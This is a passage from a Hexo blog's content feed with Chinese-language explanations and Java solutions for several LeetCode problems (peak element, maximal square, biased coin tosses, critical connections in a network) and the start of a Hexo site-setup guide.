class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> index = indexMap.get(val);</span><br><span class="line">        <span class="comment">// 在ArrayList中，交换最后一个index</span></span><br><span class="line">        <span class="keyword">if</span>(index != set.size() - <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> lastNum = set.get(set.size() - <span class="number">1</span>);</span><br><span class="line">            set.set(index, lastNum);</span><br><span class="line">            indexMap.put(lastNum, index);</span><br><span class="line">        &#125;</span><br><span class="line">        indexMap.remove(val);</span><br><span class="line">        set.remove(set.size() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get a random element from the set. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> index = random.nextInt(set.size());</span><br><span class="line">        <span class="keyword">return</span> set.get(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有一个follow up是如果允许multiple values怎么办，把map对应index从一对一改为一对多，即将HashMap的key改成HashSet即可</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Quora </tag>
            
            <tag> Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode162 Find Peak Element</title>
      <link href="/2019/10/27/LeetCode162-Find-Peak-Element/"/>
      <url>/2019/10/27/LeetCode162-Find-Peak-Element/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>A peak element is an element that is greater than its neighbors.</p><p>Given an input array nums, where nums[i] ≠ nums[i+1], find a peak element and return its index.</p><p>The array may contain multiple peaks, in that case return the index to any one of the peaks is fine.</p><p>You may imagine that nums[-1] = nums[n] = -∞.<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,3,1]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 3 is a peak element and your function should return the index number 2.</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,1,3,5,6,4]</span><br><span class="line">Output: 1 or 5 </span><br><span class="line">Explanation: Your function can return either index number 1 where the peak element is 2, </span><br><span class="line">             or index number 5 where the peak element is 6.</span><br></pre></td></tr></table></figure><p>Your solution should be in <strong>logarithmic</strong> complexity.</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>题意十分简短，也很好理解，就是一个数组，找出比左右大的那个数的index，其中最左边和最右边默认都是-∞，一个很直观的思路就扫描一遍，挨个比较左右，时间复杂度为O（n）, 但是题目后面还有一个要求，时间复杂度要为O(logn)。</p><p>显然遇到数组这类题目，O(logn)一个很直观的思路就是二分，不过二分是基于排序好的数组，那这个题目如何二分呢？</p><p>其实注意到num[i] 与 num[i+1]的关系是解决本题的关键，引用下Leetcode解题区的图，这个问题可以分为下面三种情况讨论:</p><p><img alt src="https://leetcode.com/problems/find-peak-element/Figures/162/Find_Peak_Case1.PNG"></p><p><img alt src="https://leetcode.com/problems/find-peak-element/Figures/162/Find_Peak_Case2.PNG"></p><p><img alt src="https://leetcode.com/problems/find-peak-element/Figures/162/Find_Peak_Case3.PNG"></p><p>我们发现peak是一个分界点，在这个分界点左边为上升区间，在这个分界点右边为下降区间，这样二分的思路就变得清晰了起来:</p><p>每次二分取mid，如果我们发现nums[mid] &gt; nums[mid+1]，说明这个mid位于一个下降的区间，peak应该出现在mid左边，则搜算范围应该是[left, mid]<br>如果nums[mid] &lt; nums[mid+1]，则说明mid是在一个上升的区间上，搜索范围则应该是[mid+1, right]<br>注意到题目中说明元素各不相同，我们不需要考虑相等的情况<br>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &gt; nums[mid + <span class="number">1</span>])</span><br><span class="line">            right = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道挺经典的二分变种，考察对二分搜索的认识和灵活使用，问题关键在于发现peak是上升区间和下降区间的分界点利用这个性质来进行二分搜索，挺适合作为面试题来出的，如果我是考官的话:)</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Binary-Search </tag>
            
            <tag> Quora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-221-Maximal-Square</title>
      <link href="/2019/10/22/LeetCode-221-Maximal-Square/"/>
      <url>/2019/10/22/LeetCode-221-Maximal-Square/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a 2D binary matrix filled with 0’s and 1’s, find the largest square containing only 1’s and return its area.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line"></span><br><span class="line">1 0 1 0 0</span><br><span class="line">1 0 1 1 1</span><br><span class="line">1 1 1 1 1</span><br><span class="line">1 0 0 1 0</span><br><span class="line"></span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><a id="more"></a><p>题目给了一堆0和1组成的矩阵，问矩阵中由1组成的方块的最大面积</p><p>这是我本人非常喜欢的一道题目，描述得十分简洁，实现算法从暴力到DP，能够体现出计算机科学以及算法的优雅，暴力的方法非常显而易见，穷尽所有的可能性，一行一行，发现连续的1则往下继续探索，看看是否满足方阵的要求，即长宽相等，Leetcode官方题解给出的代码如下，而且居然能够AC，可见样例比较弱<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rows = matrix.length, cols = rows &gt; <span class="number">0</span> ? matrix[<span class="number">0</span>].length : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> maxsqlen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="string">'1'</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> sqlen = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">while</span> (sqlen + i &lt; rows &amp;&amp; sqlen + j &lt; cols &amp;&amp; flag) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> k = j; k &lt;= sqlen + j; k++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (matrix[i + sqlen][k] == <span class="string">'0'</span>) &#123;</span><br><span class="line">                                flag = <span class="keyword">false</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt;= sqlen + i; k++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (matrix[k][j + sqlen] == <span class="string">'0'</span>) &#123;</span><br><span class="line">                                flag = <span class="keyword">false</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (flag)</span><br><span class="line">                            sqlen++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (maxsqlen &lt; sqlen) &#123;</span><br><span class="line">                        maxsqlen = sqlen;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxsqlen * maxsqlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>不过这题还有一个更为巧妙的方法，利用dp，我们用dp[i][j]来表示以(i, j)为右下角的方阵的边长，如图：</p><p><img alt src="https://leetcode.com/media/original_images/221_Maximal_Square.PNG?raw=true"></p><p>递推公式如下：</p><script type="math/tex; mode=display">dp(i ,j) = min(dp(i,j-1), dp(i - 1,j),dp(i-1,j-1))+1</script><p>根据递推公式，就能够用少量代码十分优雅地解决这个问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[matrix.length][matrix[<span class="number">0</span>].length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrix.length; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; matrix[<span class="number">0</span>].length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] == <span class="string">'1'</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> left = i - <span class="number">1</span> &gt; -<span class="number">1</span> ? dp[i - <span class="number">1</span>][j] : <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> up = j - <span class="number">1</span> &gt; - <span class="number">1</span> ? dp[i][j - <span class="number">1</span>] : <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> dig = i - <span class="number">1</span> &gt; - <span class="number">1</span> &amp;&amp; j - <span class="number">1</span> &gt; -<span class="number">1</span> ? dp[i - <span class="number">1</span>][j - <span class="number">1</span>] : <span class="number">0</span>;</span><br><span class="line">                    dp[i][j] = <span class="number">1</span> + Math.min(left, Math.min(up,dig));</span><br><span class="line">                    <span class="comment">// 注意这里dp存的是边长，结果要返回面积</span></span><br><span class="line">                    res = Math.max(res, dp[i][j] * dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>时间复杂度为$O(mn)$，空间复杂度为$O(mn)$，其中m、n为矩阵长宽</p><h2 id="Follow-Up"><a href="#Follow-Up" class="headerlink" title="Follow Up"></a>Follow Up</h2><p>如果要找一个最大矩形的面积呢？ </p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode1230 Toss Strange Coins</title>
      <link href="/2019/10/21/Leetcode1230-Toss-Strange-Coins/"/>
      <url>/2019/10/21/Leetcode1230-Toss-Strange-Coins/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>You have some coins.  The i-th coin has a probability prob[i] of facing heads when tossed.</p><p>Return the probability that the number of coins facing heads equals target if you toss every coin exactly once.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Example1:</span><br><span class="line">Input: prob = [0.4], target = 1</span><br><span class="line">Output: 0.40000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Example2:</span><br><span class="line">Input: prob = [0.5,0.5,0.5,0.5,0.5], target = 0</span><br><span class="line">Output: 0.03125</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Explanation:</span><br><span class="line">[[3,1]] is also accepted.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constraints:</span><br><span class="line">1 &lt;= prob.length &lt;= 1000</span><br><span class="line">0 &lt;= prob[i] &lt;= 1</span><br><span class="line">0 &lt;= target &lt;= prob.length</span><br><span class="line">Answers will be accepted as correct if they are within 10^-5 of the correct answer.</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><a id="more"></a><p>题目是这样的，有一堆不均匀的硬币，问你正好target朝上的概率是多少？</p><p>这是一道典型的动态规划问题，多举出一些样例，或者根据基础的概率论，我们可以发现每个硬币都有正反两种可能性，而到第i个硬币正好有j个朝上的概率跟此前的状态有关，我们用dp[i][j]来表示，显然第i个硬币可以朝上或者朝下，如果朝上则前面得有j - 1个硬币朝上，才能保证此时有共有j个朝上，如果此前已经有j个朝上，则第i个必须朝下，于是我们很容易得到递推式:</p><script type="math/tex; mode=display">dp(i, j) = dp(i - 1, j) * (1 - p(i)) + dp(i - 1, j - 1) * p(i)</script><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">probabilityOfHeads</span><span class="params">(<span class="keyword">double</span>[] prob, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span>[][] dp = <span class="keyword">new</span> <span class="keyword">double</span>[prob.length][target + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span> - prob[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(target &gt;= <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = prob[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prob.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= Math.min(i + <span class="number">1</span>, target); j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j] * (<span class="number">1.0</span> - prob[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j] * (<span class="number">1.0</span> - prob[i]) + dp[i - <span class="number">1</span>][j - <span class="number">1</span>] * prob[i];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[prob.length - <span class="number">1</span>][target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这道题，还可以再做空间上的优化，我们发现求dp[i][j]只跟dp[i - 1][j - 1]与dp[i][j - 1]有关，遇到这种情况，我们可以把i利用循环优化掉，只保留j，即dp[j]表示此时有j个朝上的硬币的概率，于是我们可以得到更加简化的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">probabilityOfHeads</span><span class="params">(<span class="keyword">double</span>[] prob, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span>[] dp = <span class="keyword">new</span> <span class="keyword">double</span>[target + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prob.length; ++i)</span><br><span class="line">    <span class="comment">//这边很容易出错，我们需要倒序遍历，否则之前的值(dp[j - 1])已经被修改</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = Math.min(i + <span class="number">1</span>, target); j &gt;= <span class="number">0</span>; --k)</span><br><span class="line">            dp[j] = (j &gt; <span class="number">0</span> ? dp[j - <span class="number">1</span>] : <span class="number">0</span>) * prob[i] + dp[j] * (<span class="number">1</span> - prob[i]);</span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Amazon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode1192 Critical Coneections in a Network</title>
      <link href="/2019/10/21/Leetcode1192-Critical-Coneections-in-a-Network/"/>
      <url>/2019/10/21/Leetcode1192-Critical-Coneections-in-a-Network/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>There are n servers numbered from 0 to n-1 connected by undirected server-to-server connections forming a network where connections[i] = [a, b] represents a connection between servers a and b. Any server can reach any other server directly or indirectly through the network.</p><p>A critical connection is a connection that, if removed, will make some server unable to reach some other server.</p><p>Return all critical connections in the network in any order.<br><a id="more"></a><br><img alt src="https://assets.leetcode.com/uploads/2019/09/03/1537_ex1_2.png" style="width: 198px; height: 248px;"><br><img alt src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/Bridge2-300x176.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = 4, connections = [[0,1],[1,2],[2,0],[1,3]]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output: [[1,3]]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Explanation:</span><br><span class="line">[[3,1]] is also accepted.</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是Amazon OA上的一道题，可以利用Trajan算法解决，说实话，这种考法比较无聊，如果你熟悉Tarjan就能轻松秒杀，反之死活想不出来，没有什么区分度，不过既然亚麻考了这题，还是有必要熟悉下的，我OA没有碰到，但有准备过。</p><p>这道题目的关键是理解Bridge的含义，即连通两个连通分量的桥，根据观察我们可以发现这个Critical Connection或者说Bridge不应该出现在一个环里，Tarjan算法的核心在于，找到环，它采用了一种比较巧妙的思路，即记录每个节点第一次发现的位置，如果没有环，显然这个位置是不断增大的，如果发现某个节点可以通往比它位置小的节点则说明出现了环。</p><p>理解了这个思路，用DFS搜索图，保存第一次出现的位置和所能到达的最小位置，如果前者小于后者，则说明没有环，则这条路径是Bridge也就是Critical Connection</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; criticalConnections(<span class="keyword">int</span> n, List&lt;List&lt;Integer&gt;&gt; connections) &#123;</span><br><span class="line"><span class="keyword">int</span>[] disc = <span class="keyword">new</span> <span class="keyword">int</span>[n], low = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"><span class="comment">// use adjacency list instead of matrix will save some memory, adjmatrix will cause MLE</span></span><br><span class="line">List&lt;Integer&gt;[] graph = <span class="keyword">new</span> ArrayList[n];</span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">Arrays.fill(disc, -<span class="number">1</span>); <span class="comment">// use disc to track if visited (disc[i] == -1)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">graph[i] = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// build graph</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; connections.size(); i++) &#123;</span><br><span class="line"><span class="keyword">int</span> from = connections.get(i).get(<span class="number">0</span>), to = connections.get(i).get(<span class="number">1</span>);</span><br><span class="line">graph[from].add(to);</span><br><span class="line">graph[to].add(from);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (disc[i] == -<span class="number">1</span>) &#123;</span><br><span class="line">dfs(i, low, disc, graph, res, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> time = <span class="number">0</span>; <span class="comment">// time when discover each vertex</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span>[] low, <span class="keyword">int</span>[] disc, List&lt;Integer&gt;[] graph, List&lt;List&lt;Integer&gt;&gt; res, <span class="keyword">int</span> pre)</span> </span>&#123;</span><br><span class="line">disc[u] = low[u] = ++time; <span class="comment">// discover u</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; graph[u].size(); j++) &#123;</span><br><span class="line"><span class="keyword">int</span> v = graph[u].get(j);</span><br><span class="line"><span class="keyword">if</span> (v == pre) &#123;</span><br><span class="line"><span class="keyword">continue</span>; <span class="comment">// if parent vertex, ignore</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (disc[v] == -<span class="number">1</span>) &#123; <span class="comment">// if not discovered</span></span><br><span class="line">dfs(v, low, disc, graph, res, u);</span><br><span class="line">low[u] = Math.min(low[u], low[v]);</span><br><span class="line"><span class="keyword">if</span> (low[v] &gt; disc[u]) &#123;</span><br><span class="line"><span class="comment">// u - v is critical, there is no path for v to reach back to u or previous vertices of u</span></span><br><span class="line">res.add(Arrays.asList(u, v));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// if v discovered and is not parent of u, update low[u], cannot use low[v] because u is not subtree of v</span></span><br><span class="line">low[u] = Math.min(low[u], disc[v]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Amazon </tag>
            
            <tag> Graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo配置</title>
      <link href="/2019/09/21/hexo%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/09/21/hexo%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>利用GitHub page的功能可以十分方便的设计出一个美观的个人博客，我的一些非CS的同学都有，这篇文章大概用来记录一些配置过程中踩到的坑，以后，如果有需要会逐步扩展，网上内容七零八碎，我在这里做个整合，供日后查阅，并且就权当刚建好blog的一次试水博文<br><a id="more"></a></p><h2 id="2、hexo建站"><a href="#2、hexo建站" class="headerlink" title="2、hexo建站"></a>2、hexo建站</h2><p>在mac中配置hexo其实十分方便，几行命令，选个主题就可以完成基本的建站、配置等操作。<br>以下是一些建站用到的命令，根据官网要求，首先确保有安装node.js且版本不低于8.6</p><p>安装hexo命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p><p>建站命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init &lt;folder&gt;</span><br><span class="line"><span class="meta">$</span> cd &lt;folder&gt;</span><br><span class="line"><span class="meta">$</span> npm install</span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── 